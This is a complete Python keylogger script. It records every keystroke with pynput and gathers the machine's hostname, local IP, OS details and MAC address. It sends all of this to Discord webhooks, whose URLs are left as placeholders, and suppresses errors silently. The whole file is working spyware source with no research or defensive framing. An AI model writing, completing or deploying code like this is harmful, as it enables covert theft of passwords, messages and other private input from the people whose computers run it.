from pynput import keyboard
import requests
import platform
import socket
import uuid

KEYLOG_WEBHOOK_URL = "keylog webhook url here"
PCINFO_WEBHOOK_URL = "pc info webhook url here"

def send_to_discord(webhook_url, message):
    try:
        data = {"content": message}
        requests.post(webhook_url, json=data)
    except:
        pass

def get_pc_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        system = platform.system()
        release = platform.release()
        version = platform.version()
        machine = platform.machine()
        processor = platform.processor()
        mac_addr = ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
                             for ele in range(0,8*6,8)][::-1])

        info = (
            f"PC Info:\n"
            f"Hostname: {hostname}\n"
            f"Local IP: {local_ip}\n"
            f"System: {system}\n"
            f"Release: {release}\n"
            f"Version: {version}\n"
            f"Machine: {machine}\n"
            f"Processor: {processor}\n"
            f"MAC Address: {mac_addr}"
        )
        return info
    except Exception as e:
        return f"Failed to get PC info: {e}"

def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)
    send_to_discord(KEYLOG_WEBHOOK_URL, f"Key pressed: `{key_str}`")

def main():
    pc_info = get_pc_info()
    send_to_discord(PCINFO_WEBHOOK_URL, pc_info)

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
